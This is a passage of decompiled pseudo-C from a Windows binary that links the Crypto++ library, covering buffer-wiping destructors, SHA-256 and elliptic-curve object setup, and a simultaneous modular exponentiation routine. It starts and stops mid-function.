  v7 = *(void **)(this + 48);
  memset(v7, 0, *(_DWORD *)((*(_DWORD *)(this + 40) < *(_DWORD *)(this + 44) ? 0xFFFFFFFC : 0) + this + 44));
  j_j___free_base(v7);
  v6 = *(void **)(this + 32);
  memset(v6, 0, *(_DWORD *)((*(_DWORD *)(this + 24) < *(_DWORD *)(this + 28) ? 0xFFFFFFFC : 0) + this + 28));
  j_j___free_base(v6);
  v4 = *(_DWORD *)(this + 12);
  v5 = *(void **)(this + 16);
  if ( *(_DWORD *)(this + 8) < v4 )
    v4 = *(_DWORD *)(this + 8);
  memset(*(void **)(this + 16), 0, v4);
  j_j___free_base(v5);
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);

//----- (0043A1D0) --------------------------------------------------------
void __thiscall sub_43A1D0(_DWORD *this)
{
  unsigned int v2; // ecx
  void *v3; // edx

  v2 = this[2];
  if ( this[1] < v2 )
    v2 = this[1];
  v3 = (void *)this[3];
  memset(v3, 0, 4 * v2);
  j_j___free_base(v3);
}

//----- (0043A280) --------------------------------------------------------
void __thiscall sub_43A280(_DWORD *this)
{
  int v2; // edx
  unsigned int v3; // edx
  void *v4; // esi
  void *v5; // [esp-4h] [ebp-20h]

  v5 = (void *)this[10];
  v2 = *(_DWORD *)((char *)this + (this[8] < this[9] ? 0xFFFFFFFC : 0) + 36);
  memset(v5, 0, 4 * v2);
  if ( v2 )
    j_j_unknown_libname_61(v5);
  else
    j_j___free_base(v5);
  v3 = this[3];
  if ( this[2] < v3 )
    v3 = this[2];
  v4 = (void *)this[4];
  memset(v4, 0, 4 * v3);
  if ( v3 )
    j_j_unknown_libname_61(v4);
  else
    j_j___free_base(v4);
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);

//----- (0043A320) --------------------------------------------------------
_DWORD *__cdecl sub_43A320(_DWORD *a1, int a2, int a3)
{
  int v3; // edi
  _BYTE *v4; // edx
  _BYTE *v5; // eax
  int v6; // ecx
  int v7; // esi
  int v8; // esi
  _DWORD *v9; // eax
  const void *v10; // ecx
  _DWORD *v11; // ebx
  int v12; // eax
  size_t v13; // esi
  int v14; // ebx
  _DWORD *v15; // esi
  void *v16; // eax
  signed int v17; // ebx
  _DWORD *v18; // edi
  void *v20; // [esp-8h] [ebp-34h]
  void **v21; // [esp+10h] [ebp-1Ch] BYREF
  void *Src; // [esp+14h] [ebp-18h] BYREF
  _BYTE *v23; // [esp+18h] [ebp-14h]
  int v24; // [esp+1Ch] [ebp-10h]
  int v25; // [esp+28h] [ebp-4h]

  v3 = a2;
  v4 = 0;
  v5 = 0;
  v21 = &CryptoPP::OID::`vftable';
  Src = 0;
  v23 = 0;
  v6 = *(_DWORD *)(a2 + 4);
  v7 = *(_DWORD *)(a2 + 8);
  v24 = 0;
  if ( v6 != v7 )
  {
    v8 = (v7 - v6) >> 2;
    v9 = sub_4343B0(v8);
    v10 = *(const void **)(v3 + 4);
    v11 = v9;
    Src = v9;
    v12 = (int)&v9[v8];
    v13 = *(_DWORD *)(v3 + 8) - (_DWORD)v10;
    a2 = v12;
    v24 = v12;
    memmove_0(Src, v10, v13);
    v4 = (_BYTE *)a2;
    v5 = (char *)v11 + v13;
    v23 = (char *)v11 + v13;
  }
  v25 = 0;
  a2 = a3;
  if ( v4 == v5 )
  {
    sub_432890((const void **)&Src, v5, &a2);
    v14 = (int)v23;
  }
  else
  {
    v14 = (int)(v5 + 4);
    *(_DWORD *)v5 = a3;
    v23 = v5 + 4;
  }
  v15 = a1;
  v16 = Src;
  *a1 = &CryptoPP::OID::`vftable';
  a1[1] = 0;
  a1[2] = 0;
  a1[3] = 0;
  if ( v16 != (void *)v14 )
  {
    v17 = v14 - (_DWORD)v16;
    v18 = sub_4343B0(v17 >> 2);
    v20 = Src;
    a1[1] = v18;
    a1[2] = v18;
    a1[3] = &v18[v17 >> 2];
    memmove_0(v18, v20, v17);
    v15 = a1;
    a1[2] = (char *)v18 + v17;
  }
  sub_408A00(&v21);
  return v15;
}
// 4B8A28: using guessed type void *CryptoPP::OID::`vftable';

//----- (0043A450) --------------------------------------------------------
int __thiscall sub_43A450(int this, char a2)
{
  int v3; // edx
  void *v5; // [esp-4h] [ebp-20h]

  v5 = *(void **)(this + 32);
  v3 = *(_DWORD *)((*(_DWORD *)(this + 24) < *(_DWORD *)(this + 28) ? 0xFFFFFFFC : 0) + this + 28);
  memset(v5, 0, 4 * v3);
  if ( v3 )
    j_j_unknown_libname_61(v5);
  else
    j_j___free_base(v5);
  sub_406980((const char **)this);
  if ( (a2 & 1) != 0 )
    sub_46C87D((void *)this);
  return this;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);

//----- (0043A4F0) --------------------------------------------------------
int __thiscall sub_43A4F0(int this, char a2)
{
  unsigned int v3; // ecx
  void *v4; // edi
  unsigned int v5; // ecx
  void *v6; // edi

  v3 = *(_DWORD *)(this + 300);
  if ( *(_DWORD *)(this + 296) < v3 )
    v3 = *(_DWORD *)(this + 296);
  v4 = *(void **)(this + 304);
  if ( v4 == (void *)(this + 224) )
  {
    *(_BYTE *)(this + 289) = 0;
    memset(v4, 0, 4 * v3);
  }
  v5 = *(_DWORD *)(this + 212);
  v6 = *(void **)(this + 216);
  if ( *(_DWORD *)(this + 208) < v5 )
    v5 = *(_DWORD *)(this + 208);
  if ( v6 == (void *)(this + 136) )
  {
    *(_BYTE *)(this + 201) = 0;
    memset(v6, 0, 4 * v5);
  }
  sub_43A090(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D((void *)this);
  return this;
}

//----- (0043A560) --------------------------------------------------------
char *__thiscall sub_43A560(char *this, char a2)
{
  unsigned int v3; // ecx
  void *v4; // edx
  void *v6; // [esp-4h] [ebp-1Ch]

  *(_DWORD *)this = &CryptoPP::EC2NPoint::`vftable';
  v6 = (void *)*((_DWORD *)this + 8);
  memset(v6, 0, 4 * *(_DWORD *)&this[(*((_DWORD *)this + 6) < *((_DWORD *)this + 7) ? 0xFFFFFFFC : 0) + 28]);
  j_j___free_base(v6);
  v3 = *((_DWORD *)this + 3);
  v4 = (void *)*((_DWORD *)this + 4);
  if ( *((_DWORD *)this + 2) < v3 )
    v3 = *((_DWORD *)this + 2);
  memset(*((void **)this + 4), 0, 4 * v3);
  j_j___free_base(v4);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4BAAE4: using guessed type void *CryptoPP::EC2NPoint::`vftable';

//----- (0043A600) --------------------------------------------------------
_DWORD *__thiscall sub_43A600(_DWORD *this, char a2)
{
  sub_439E50(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (0043A620) --------------------------------------------------------
_DWORD *__thiscall sub_43A620(_DWORD *this, char a2)
{
  sub_439F00(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (0043A640) --------------------------------------------------------
int __thiscall sub_43A640(int this, char a2)
{
  int v3; // edx
  unsigned int v4; // edx
  void *v5; // ebx
  void *v7; // [esp-4h] [ebp-20h]

  *(_DWORD *)this = &CryptoPP::MontgomeryRepresentation::`vftable';
  v7 = *(void **)(this + 120);
  v3 = *(_DWORD *)((*(_DWORD *)(this + 112) < *(_DWORD *)(this + 116) ? 0xFFFFFFFC : 0) + this + 116);
  memset(v7, 0, 4 * v3);
  if ( v3 )
    j_j_unknown_libname_61(v7);
  else
    j_j___free_base(v7);
  v4 = *(_DWORD *)(this + 96);
  v5 = *(void **)(this + 100);
  if ( *(_DWORD *)(this + 92) < v4 )
    v4 = *(_DWORD *)(this + 92);
  memset(*(void **)(this + 100), 0, 4 * v4);
  if ( v4 )
    j_j_unknown_libname_61(v5);
  else
    j_j___free_base(v5);
  sub_439F00((_DWORD *)this);
  if ( (a2 & 1) != 0 )
    sub_46C87D((void *)this);
  return this;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 4BA514: using guessed type void *CryptoPP::MontgomeryRepresentation::`vftable';

//----- (0043A700) --------------------------------------------------------
void *__thiscall sub_43A700(void *this, char a2)
{
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (0043A720) --------------------------------------------------------
int __thiscall sub_43A720(int this, char a2)
{
  unsigned int v3; // ecx
  void *v4; // edi
  unsigned int v5; // ecx
  void *v6; // edi

  v3 = *(_DWORD *)(this + 188);
  if ( *(_DWORD *)(this + 184) < v3 )
    v3 = *(_DWORD *)(this + 184);
  v4 = *(void **)(this + 192);
  if ( v4 == (void *)(this + 104 + (-(this + 104) & 0xF)) )
  {
    *(_BYTE *)(this + 177) = 0;
    memset(v4, 0, 4 * v3);
  }
  v5 = *(_DWORD *)(this + 92);
  v6 = *(void **)(this + 96);
  if ( *(_DWORD *)(this + 88) < v5 )
    v5 = *(_DWORD *)(this + 88);
  if ( v6 == (void *)(this + 16) )
  {
    *(_BYTE *)(this + 81) = 0;
    memset(v6, 0, 4 * v5);
  }
  if ( (a2 & 1) != 0 )
    sub_46C87D((void *)this);
  return this;
}

//----- (0043A790) --------------------------------------------------------
char *__thiscall sub_43A790(char *this)
{
  return this + 120;
}

//----- (0043A7A0) --------------------------------------------------------
int __thiscall sub_43A7A0(void *this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 24))(this);
  return *(_DWORD *)(*(_DWORD *)(v1 + 4) + 4) + v1 + 4;
}

//----- (0043A7C0) --------------------------------------------------------
_DWORD *__thiscall sub_43A7C0(_DWORD **this, _DWORD *a2, int a3)
{
  _DWORD *v3; // eax

  v3 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, _DWORD *, int))(*this[1] + 60))(this[1], a2, a3);
  return sub_43DBB0(a2, v3);
}

//----- (0043A7E0) --------------------------------------------------------
int __thiscall sub_43A7E0(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[1] + 60))(this[1]);
}

//----- (0043A7F0) --------------------------------------------------------
int __stdcall sub_43A7F0(int a1)
{
  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 20) = 15;
  *(_BYTE *)a1 = 0;
  sub_41EF80((void **)a1, "SHA-256", 7u);
  return a1;
}

//----- (0043A820) --------------------------------------------------------
void __noreturn sub_43A820()
{
  char pExceptionObject[40]; // [esp+4h] [ebp-50h] BYREF
  _DWORD v1[10]; // [esp+2Ch] [ebp-28h] BYREF

  sub_419B80((int)v1, "PK_MessageEncodingMethod: this signature scheme does not support message recovery");
  v1[9] = 0;
  sub_4053E0(pExceptionObject, v1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVNotImplemented_CryptoPP__);
}
// 43A820: using guessed type void __noreturn sub_43A820();

//----- (0043A880) --------------------------------------------------------
char __thiscall sub_43A880(unsigned int *this, void *a2, int a3, _DWORD *a4)
{
  unsigned int *v4; // esi
  char result; // al

  v4 = this + 4;
  if ( __std_type_info_compare(&dword_4E9290, &dword_4EE1D8) || (result = sub_43EE60(a3, a4, v4)) == 0 )
  {
    sub_4059C0(a2, (int)&CryptoPP::Integer `RTTI Type Descriptor', a3);
    return (unsigned __int8)sub_43DBB0(a4, v4);
  }
  return result;
}
// 48384F: using guessed type _DWORD __cdecl __std_type_info_compare(_DWORD, _DWORD);
// 4E9290: using guessed type int dword_4E9290;
// 4EE1D8: using guessed type int dword_4EE1D8;

//----- (0043A8E0) --------------------------------------------------------
_DWORD *__thiscall sub_43A8E0(void *this, _DWORD *a2, _DWORD *a3, _DWORD *a4, _DWORD *a5, _DWORD *a6)
{
  int *v6; // eax

  v6 = (int *)(*(int (__thiscall **)(void *))(*(_DWORD *)this + 88))(this);
  sub_43A910(v6, a2, a3, a4, a5, a6);
  return a2;
}

//----- (0043A910) --------------------------------------------------------
_DWORD *__thiscall sub_43A910(int *this, _DWORD *a2, _DWORD *a3, _DWORD *a4, _DWORD *a5, _DWORD *a6)
{
  int v6; // ebx
  unsigned int v7; // esi
  unsigned int v8; // eax
  _DWORD *v9; // eax
  int v11; // eax
  int v12; // edx
  int v13; // esi
  unsigned int v14; // edi
  _DWORD *v15; // esi
  unsigned int v16; // ebx
  int v17; // edx
  int v18; // esi
  _DWORD *v19; // eax
  _DWORD *v20; // eax
  int v21; // eax
  _DWORD *v22; // esi
  _DWORD *v23; // eax
  unsigned int v24; // edx
  int v25; // ecx
  _DWORD *v26; // edi
  _DWORD *v27; // eax
  bool v28; // zf
  unsigned int v29; // eax
  int v30; // ecx
  int v31; // esi
  unsigned int v32; // edx
  int v33; // edx
  _DWORD *v34; // esi
  _DWORD *v35; // eax
  int v36; // esi
  int v37; // ecx
  int v38; // edx
  _DWORD *v39; // edi
  _DWORD *v40; // eax
  unsigned int v41; // esi
  int v42; // ecx
  unsigned int v43; // eax
  int v44; // ebx
  unsigned int v45; // edi
  _DWORD *v46; // esi
  _DWORD *v47; // eax
  unsigned int v48; // edi
  unsigned int v49; // esi
  signed int v50; // ebx
  int v51; // ecx
  int v52; // ebx
  int v53; // esi
  _DWORD *v54; // eax
  unsigned int v55; // edx
  void *v56; // esi
  int *v57; // edi
  int v58; // eax
  _DWORD *v59; // eax
  int v60; // ecx
  _DWORD v61[2]; // [esp+10h] [ebp-78h] BYREF
  unsigned int v62; // [esp+18h] [ebp-70h]
  unsigned int v63; // [esp+1Ch] [ebp-6Ch]
  void *Block; // [esp+20h] [ebp-68h]
  _DWORD *v65; // [esp+28h] [ebp-60h]
  _DWORD *v66; // [esp+2Ch] [ebp-5Ch]
  _DWORD **v67; // [esp+30h] [ebp-58h]
  _DWORD *v68; // [esp+34h] [ebp-54h] BYREF
  _DWORD *v69; // [esp+38h] [ebp-50h]
  _DWORD *v70; // [esp+3Ch] [ebp-4Ch]
  int v71; // [esp+40h] [ebp-48h]
  int v72; // [esp+44h] [ebp-44h]
  unsigned int v73; // [esp+48h] [ebp-40h]
  unsigned int v74; // [esp+4Ch] [ebp-3Ch]
  unsigned int v75; // [esp+50h] [ebp-38h]
  unsigned int v76; // [esp+54h] [ebp-34h]
  unsigned int v77; // [esp+58h] [ebp-30h]
  int v78; // [esp+5Ch] [ebp-2Ch]
  int v79; // [esp+60h] [ebp-28h]
  unsigned int v80; // [esp+64h] [ebp-24h]
  int v81; // [esp+68h] [ebp-20h]
  unsigned int v82; // [esp+6Ch] [ebp-1Ch]
  int v83; // [esp+70h] [ebp-18h]
  int *v84; // [esp+74h] [ebp-14h]
  unsigned int v85; // [esp+78h] [ebp-10h]
  int v86; // [esp+84h] [ebp-4h]
  int v87; // [esp+94h] [ebp+Ch]
  unsigned int v88; // [esp+9Ch] [ebp+14h]
  int v89; // [esp+9Ch] [ebp+14h]
  char v90; // [esp+9Fh] [ebp+17h]

  v6 = (int)this;
  v84 = this;
  v71 = 0;
  v7 = sub_440BD0(a6);
  v8 = sub_440BD0(a4);
  if ( v8 < v7 )
    v8 = v7;
  v72 = v8;
  if ( !v8 )
  {
    v9 = (_DWORD *)(*(int (__thiscall **)(int))(*(_DWORD *)v6 + 8))(v6);
    sub_43D420(a2, v9);
    return a2;
  }
  if ( v8 > 0x2E )
    v11 = (v8 > 0x104) + 2;
  else
    v11 = 1;
  v83 = v11;
  v12 = 0;
  v13 = 1 << v11;
  v85 = 1 << v11;
  v14 = 1 << v11 << v11;
  v82 = v14;
  v68 = 0;
  v69 = 0;
  v70 = 0;
  if ( v14 )
  {
    if ( v14 > 0xAAAAAAA )
      sub_420130();
    v68 = sub_43CC00(1 << v11 << v11);
    v69 = v68;
    v73 = (unsigned int)&v68;
    v70 = &v68[6 * v14];
    v15 = v68;
    v86 = 2;
    v65 = v68;
    v66 = v68;
    v67 = &v68;
    v16 = v14;
    do
    {
      sub_43D6C0(v15);
      v15 += 6;
      v66 = v15;
      --v16;
    }
    while ( v16 );
    v12 = (int)v68;
    v6 = (int)v84;
    v69 = v15;
    v13 = v85;
  }
  v86 = 3;
  sub_43DBB0((_DWORD *)(v12 + 24), a3);
  v79 = 24 * v13;
  sub_43DBB0(&v68[6 * v13], a5);
  v17 = *(_DWORD *)v6;
  v18 = (int)v68;
  if ( v83 == 1 )
  {
    v19 = (_DWORD *)(*(int (__thiscall **)(int, _DWORD *, _DWORD *))(v17 + 12))(v6, a3, a5);
    sub_43DBB0((_DWORD *)(v18 + 72), v19);
  }
  else
  {
    v20 = (_DWORD *)(*(int (__thiscall **)(int, _DWORD *))(v17 + 24))(v6, a3);
    sub_43DBB0((_DWORD *)(v18 + 48), v20);
    v21 = *(_DWORD *)v6;
    v73 = 48 * v85;
    v22 = &v68[12 * v85];
    v23 = (_DWORD *)(*(int (__thiscall **)(int, _DWORD *))(v21 + 24))(v6, a5);
    sub_43DBB0(v22, v23);
    v24 = v85;
    if ( v85 > 3 )
    {
      v25 = 72;
      v81 = 72;
      v80 = ((v85 - 4) >> 1) + 1;
      do
      {
        v26 = (_DWORD *)((char *)v68 + v25);
        v27 = (_DWORD *)(*(int (__thiscall **)(int, int, _DWORD *))(*(_DWORD *)v6 + 12))(
                          v6,
                          (int)v68 + v25 - 48,
                          v68 + 12);
        sub_43DBB0(v26, v27);
        v25 = v81 + 48;
        v28 = v80-- == 1;
        v81 += 48;
      }
      while ( !v28 );
      v14 = v82;
      v24 = v85;
    }
    if ( v24 > 1 )
    {
      v29 = v24 + 1;
      v77 = v24 + 1;
      v30 = v79 + 24;
      v31 = 24;
      v76 = v79 + 24;
      v32 = ((v24 - 2) >> 1) + 1;
      v75 = 24;
      v74 = v32;
      do
      {
        v80 = v29;
        if ( v29 < v14 )
        {
          v81 = v30;
          v33 = v31;
          v78 = v31;
          do
          {
            v34 = (_DWORD *)((char *)v68 + v30);
            v35 = (_DWORD *)(*(int (__thiscall **)(int, int, _DWORD *))(*(_DWORD *)v6 + 12))(v6, (int)v68 + v33, a5);
            sub_43DBB0(v34, v35);
            v30 = v79 + v81;
            v33 = v79 + v78;
            v80 += v85;
            v81 += v79;
            v78 += v79;
          }
          while ( v80 < v14 );
          v29 = v77;
          v30 = v76;
          v31 = v75;
          v32 = v74;
        }
        v29 += 2;
        v30 += 48;
        v31 += 48;
        v77 = v29;
        --v32;
        v76 = v30;
        v75 = v31;
        v74 = v32;
      }
      while ( v32 );
      v24 = v85;
    }
    v88 = 3 * v24;
    if ( 3 * v24 < v14 )
    {
      v36 = v73;
      v37 = 72 * v24;
      v76 = 2 * v24;
      v74 = 72 * v24;
      v38 = 24 * v24;
      v75 = v38;
      do
      {
        v39 = (_DWORD *)((char *)v68 + v37);
        v40 = (_DWORD *)(*(int (__thiscall **)(int, int, int))(*(_DWORD *)v6 + 12))(v6, (int)v68 + v38, (int)v68 + v36);
        sub_43DBB0(v39, v40);
        v36 = v73;
        v37 = v73 + v74;
        v14 = v82;
        v38 = v73 + v75;
        v88 += v76;
        v74 += v73;
        v75 += v73;
      }
      while ( v88 < v82 );
      v24 = v85;
    }
    v41 = v24;
    v73 = v24;
    if ( v24 < v14 )
    {
      v78 = 48 * v24;
      v42 = 24 * (v24 + 2);
      v43 = 2 * v24;
      v77 = 2 * v24;
      v75 = 2 * v24;
      v76 = 2 - v24;
      v44 = (int)v84;
      v74 = v42;
      do
      {
        if ( v43 + v76 < v43 )
        {
          v89 = v42;
          v45 = ((-v76 - 1) >> 1) + 1;
          do
          {
            v46 = (_DWORD *)((char *)v68 + v42);
            v47 = (_DWORD *)(*(int (__thiscall **)(int, int, _DWORD *))(*(_DWORD *)v44 + 12))(
                              v44,
                              (int)v68 + v42 - 24,
                              a3);
            sub_43DBB0(v46, v47);
            v42 = v89 + 48;
            v89 += 48;
            --v45;
          }
          while ( v45 );
          v43 = v75;
          v14 = v82;
          v42 = v74;
          v41 = v73;
        }
        v41 += v77;
        v42 += v78;
        v43 += v77;
        v73 = v41;
        v74 = v42;
        v75 = v43;
      }
      while ( v41 < v14 );
    }
  }
  sub_43D6C0(v61);
  v48 = 0;
  v49 = 0;
  LOBYTE(v86) = 4;
  v90 = 1;
  v50 = v72 - 1;
  v73 = v72 - 1;
  v87 = v72 - 1;
  if ( v72 - 1 >= 0 )
  {
    while ( 1 )
    {
      v48 = (unsigned __int8)sub_4428B0(a4, v50) + 2 * v48;
      v49 = (unsigned __int8)sub_4428B0(a6, v50) + 2 * v49;
      if ( !v50 || 2 * v48 >= v85 || 2 * v49 >= v85 )
        break;
LABEL_55:
      v87 = --v50;
      if ( v50 < 0 )
        goto LABEL_56;
    }
    v51 = v73 - v50;
    v52 = 0;
    v73 = v87;
    while ( (v48 || v49) && (((unsigned __int8)v48 | (unsigned __int8)v49) & 1) == 0 )
    {
      v48 >>= 1;
      --v51;
      v49 >>= 1;
      ++v52;
    }
    v74 = v48;
    if ( v90 )
    {
      sub_43DBB0(v61, &v68[6 * v48 + 6 * (v49 << v83)]);
      v90 = 0;
    }
    else
    {
      if ( v51 )
      {
        v57 = v84;
        do
        {
          v58 = *v57;
          v72 = v51 - 1;
          v59 = (_DWORD *)(*(int (__thiscall **)(int *, _DWORD *))(v58 + 24))(v57, v61);
          sub_43DBB0(v61, v59);
          v51 = v72;
        }
        while ( v72 );
        v48 = v74;
      }
      if ( v48 || v49 )
      {
        v60 = 3 * (v48 + (v49 << v83));
        v53 = (int)v84;
        (*(void (__thiscall **)(int *, _DWORD *, _DWORD *))(*v84 + 32))(v84, v61, &v68[2 * v60]);
        goto LABEL_52;
      }
    }
    v53 = (int)v84;
LABEL_52:
    while ( v52 )
    {
      v54 = (_DWORD *)(*(int (__thiscall **)(int, _DWORD *))(*(_DWORD *)v53 + 24))(v53, v61);
      sub_43DBB0(v61, v54);
      --v52;
    }
    v50 = v87;
    v49 = 0;
    v48 = 0;
    goto LABEL_55;
  }
LABEL_56:
  sub_43D420(a2, v61);
  v71 = 1;
  v55 = v63;
  v56 = Block;
  if ( v62 < v63 )
    v55 = v62;
  LOBYTE(v86) = 5;
  memset(Block, 0, 4 * v55);
  if ( v55 )
    j_j_unknown_libname_61(v56);
  else
    j_j___free_base(v56);
  sub_43C960(&v68);
  return a2;
}
// 43AA0C: conditional instruction was optimized away because edi.4 is in (1..AAAAAAA)
// 420130: using guessed type void __noreturn sub_420130(void);
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 43A910: using guessed type _DWORD var_78[2];

//----- (0043AE60) --------------------------------------------------------
int __thiscall sub_43AE60(_DWORD **this, int a2, int a3, int a4, int a5, int a6)
{
  (*(void (__thiscall **)(_DWORD *, int, int, int, int, int))(*this[1] + 80))(this[1], a2, a3, a4, a5, a6);
  return a2;
}

//----- (0043AE90) --------------------------------------------------------
_DWORD *__thiscall sub_43AE90(void *this)
{
  _DWORD *v2; // eax
  _DWORD *v3; // esi
  int v4; // edx

  v2 = operator new(0xC8u);
  v3 = v2;
  if ( !v2 )
    return 0;
  sub_41D5C0((int)v2, (int)this);
  sub_439BD0((int)(v3 + 26), v4, (int)this + 104);
  *v3 = &CryptoPP::SHA256::`vftable';
  return v3;
}
// 43AEBB: variable 'v4' is possibly undefined
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4BAA6C: using guessed type void *CryptoPP::SHA256::`vftable';

//----- (0043AEE0) --------------------------------------------------------
_DWORD *__thiscall sub_43AEE0(_DWORD *this)
{
  _DWORD *v2; // esi

  v2 = operator new(0x54u);
  if ( !v2 )
    return 0;
  v2[1] = &CryptoPP::AbstractRing<CryptoPP::Integer>::MultiplicativeGroupT::`vftable';
  v2[2] = v2;
  *v2 = &CryptoPP::ModularArithmetic::`vftable';
  sub_43D420(v2 + 3, this + 3);
  sub_43D360(v2 + 9, 0, this[6]);
  sub_43D6C0(v2 + 15);
  return v2;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4BA46C: using guessed type void *CryptoPP::AbstractRing<CryptoPP::Integer>::MultiplicativeGroupT::`vftable';
// 4BA4A4: using guessed type void *CryptoPP::ModularArithmetic::`vftable';

//----- (0043AF80) --------------------------------------------------------
_DWORD *__thiscall sub_43AF80(_DWORD *this)
{
  _DWORD *v2; // eax

  v2 = operator new(0x7Cu);
  if ( v2 )
    return sub_439C40(v2, this);
  else
    return 0;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (0043AFF0) --------------------------------------------------------
_DWORD *__thiscall sub_43AFF0(_DWORD *this, _DWORD *a2, _DWORD *a3)
{
  sub_4432F0(a3, a2, this + 3);
  return a2;
}

//----- (0043B010) --------------------------------------------------------
_DWORD *__thiscall sub_43B010(_DWORD *this, _DWORD *a2, _DWORD *a3)
{
  int v4; // esi
  _DWORD *v5; // eax
  _DWORD *v6; // eax
  unsigned int v7; // edx
  void *v8; // esi
  unsigned int v9; // edx
  void *v10; // ebx
  int v12; // [esp+10h] [ebp-40h] BYREF
  unsigned int v13; // [esp+18h] [ebp-38h]
  unsigned int v14; // [esp+1Ch] [ebp-34h]
  void *v15; // [esp+20h] [ebp-30h]
  int v16; // [esp+28h] [ebp-28h] BYREF
  unsigned int v17; // [esp+30h] [ebp-20h]
  unsigned int v18; // [esp+34h] [ebp-1Ch]
  void *Block; // [esp+38h] [ebp-18h]
  int v20; // [esp+40h] [ebp-10h]
  int v21; // [esp+4Ch] [ebp-4h]
  _DWORD *v22; // [esp+5Ch] [ebp+Ch]

  v20 = 0;
  v4 = this[6];
  v21 = 1;
  v5 = sub_43D420(&v16, a3);
  LOBYTE(v21) = 2;
  v6 = (_DWORD *)sub_43E590((int)v5, 32 * v4);
  v22 = sub_43D420(&v12, v6);
  v20 = 2;
  v7 = v18;
  v8 = Block;
  if ( v17 < v18 )
    v7 = v17;
  LOBYTE(v21) = 3;
  memset(Block, 0, 4 * v7);
  if ( v7 )
    j_j_unknown_libname_61(v8);
  else
    j_j___free_base(v8);
  LOBYTE(v21) = 1;
  sub_4432F0(v22, a2, this + 3);
  v20 = 5;
  v9 = v14;
  v10 = v15;
  if ( v13 < v14 )
    v9 = v13;
  v21 = 4;
  memset(v15, 0, 4 * v9);
  if ( v9 )
    j_j_unknown_libname_61(v10);
  else
    j_j___free_base(v10);
  return a2;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);

//----- (0043B110) --------------------------------------------------------
_DWORD *__stdcall sub_43B110(_DWORD *a1, _DWORD *a2)
{
  sub_43D420(a1, a2);
  return a1;
}

//----- (0043B130) --------------------------------------------------------
void __noreturn sub_43B130()
{
  char pExceptionObject[40]; // [esp+4h] [ebp-50h] BYREF
  _DWORD v1[10]; // [esp+2Ch] [ebp-28h] BYREF

  sub_419B80((int)v1, "PK_MessageAccumulator: DigestSize() should not be called");
  v1[9] = 0;
  sub_4053E0(pExceptionObject, v1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVNotImplemented_CryptoPP__);
}
// 43B130: using guessed type void __noreturn sub_43B130();

//----- (0043B190) --------------------------------------------------------
int __thiscall sub_43B190(int *this, int a2, int a3)
{
  int v4; // esi
  int v5; // eax

  v4 = *this;
  v5 = (*(int (__thiscall **)(int *, int))(*this + 64))(this, a3);
  return (*(int (__thiscall **)(int *, int, int))(v4 + 60))(this, a2, v5);
}

//----- (0043B1B0) --------------------------------------------------------
int __thiscall sub_43B1B0(void *this, int a2)
{
  return (*(int (__thiscall **)(void *, int, int))(*(_DWORD *)this + 12))(this, a2, a2);
}

//----- (0043B1C0) --------------------------------------------------------
int __thiscall sub_43B1C0(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[1] + 68))(this[1]);
}

//----- (0043B1D0) --------------------------------------------------------
bool __stdcall sub_43B1D0(_DWORD *a1, int a2)
{
  return sub_440F30(a1, a2) == 0;
}

//----- (0043B1F0) --------------------------------------------------------
int __thiscall sub_43B1F0(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[1] + 4))(this[1]);
}

//----- (0043B200) --------------------------------------------------------
_DWORD *__thiscall sub_43B200(void *this, _DWORD *a2, int a3, int a4)
{
  sub_43D6C0(a2);
  (*(void (__thiscall **)(void *, _DWORD *, int, int, int))(*(_DWORD *)this + 84))(this, a2, a3, a4, 1);
  return a2;
}

//----- (0043B280) --------------------------------------------------------
_DWORD *__thiscall sub_43B280(_DWORD *this, _DWORD *a2, _DWORD *a3)
{
  int v4; // esi
  int v5; // ebx
  int v6; // eax
  _DWORD *v7; // eax
  _DWORD *v8; // eax
  int v9; // ecx
  int v10; // esi
  int v11; // eax
  bool v12; // zf
  _DWORD *v13; // esi
  _QWORD *v15; // [esp+10h] [ebp-64h]
  int v16; // [esp+14h] [ebp-60h]
  int v17; // [esp+18h] [ebp-5Ch]
  _QWORD v18[3]; // [esp+1Ch] [ebp-58h] BYREF
  _DWORD v19[6]; // [esp+34h] [ebp-40h] BYREF
  char v20[24]; // [esp+4Ch] [ebp-28h] BYREF
  int v21; // [esp+70h] [ebp-4h]

  sub_43D420(v18, a3);
  v21 = 0;
  sub_43D420(v19, a2);
  LOBYTE(v21) = 1;
  `eh vector constructor iterator'(
    v20,
    0x18u,
    1u,
    (void (__thiscall *)(void *))sub_43D6C0,
    (void (__thiscall *)(void *))sub_4066A0);
  v4 = *this;
  v21 = 2;
  v5 = 0;
  v17 = 1;
  v16 = 2;
  v6 = (*(int (__thiscall **)(_DWORD *))(v4 + 8))(this);
  if ( !(*(unsigned __int8 (__thiscall **)(_DWORD *, _DWORD *, int))(v4 + 4))(this, v19, v6) )
  {
    v7 = v19;
    do
    {
      v8 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, _QWORD *, _DWORD *))(*this + 96))(this, &v18[3 * v5], v7);
      sub_43DBB0(&v18[3 * v16], v8);
      v9 = v16;
      v16 = v5;
      v5 = v17;
      v10 = *this;
      v17 = v9;
